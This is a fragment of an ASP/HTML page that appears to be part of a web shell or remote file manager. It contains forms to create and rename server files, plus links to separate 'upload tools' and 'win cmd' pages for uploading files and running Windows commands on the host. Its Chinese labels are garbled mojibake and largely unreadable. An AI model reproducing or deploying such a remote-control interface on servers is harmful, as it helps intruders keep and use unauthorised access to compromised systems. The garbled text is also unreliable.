please enter���ļ�������:
(��"abc.txt",���Ҳ�Ҫ���� \ / : * ? " < > |)<br>
<input type="text" name="crFileName" size="50" class="text"><br>
<input type="submit" name="submit" value="CreateFile" class="button2">
</form>
<hr></div>
<!---->
<!--rename-->
<div id="Div_rename" style="display:none;margin-top:3px;LETTER-SPACING:0px">
<b>������һ���ļ��л��ļ�(Rename)</b><br>
�㽫������һ���ļ��л��ļ���:<font color=red><%=path%></font><br>
<form method="POST" action="<%=LUCY%>">
<input type="hidden" name="path" value="<%=path%>">
<input type="hidden" id="Div_rename_hidden" name="oldFileName">
���ȵ���ļ��б��ұ߶�Ӧ��"������"����,Ȼ���ڴ˶Ի����и����ļ�����:(��Ҫ���� \ / : * ? " < > |)<br>
<input type="text" id="Div_rename_input" name="newFileName" size="50" class="text"><br>
<input type="submit" name="submit" value="Rename" class="button2">
</form>
<hr></div>
<!---->
<!--about-->
<div id="Div_extension" style="display:none;margin-top:3px;LETTER-SPACING:0px">
<b>��չ����(Extensions)</b><br>
<a href="<%=PUT_FILENAME%>?path=<%=URLpath%>" target="_blank">[upload tools]</a>&nbsp;&nbsp;
<a href="<%=CMD_FILENAME%>?path=<%=URLpath%>" target="_blank">[win cmd]</a>&nbsp;&nbsp;
<br><hr></div>
</body></html>